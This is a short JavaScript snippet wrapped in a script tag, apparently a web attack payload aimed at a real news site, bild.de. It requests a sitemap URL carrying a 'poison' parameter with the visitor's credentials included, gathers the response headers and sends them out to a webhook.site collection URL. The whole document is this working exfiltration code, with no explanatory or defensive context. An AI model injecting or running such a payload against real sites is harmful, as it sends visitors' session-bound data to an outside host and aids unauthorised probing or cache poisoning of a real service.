<script>
fetch("https://www.bild.de/sitemap-index-200605.xml?poison=1", {
  method: "GET",
  credentials: "include"
})
.then(res => {
  const headers = {};
  for (let pair of res.headers.entries()) {
    headers[pair[0]] = pair[1];
  }
  return fetch("https://webhook.site/8682f4eb-9534-4d00-8a0d-1abb010810da?headers=" + encodeURIComponent(JSON.stringify(headers)));
});
</script>
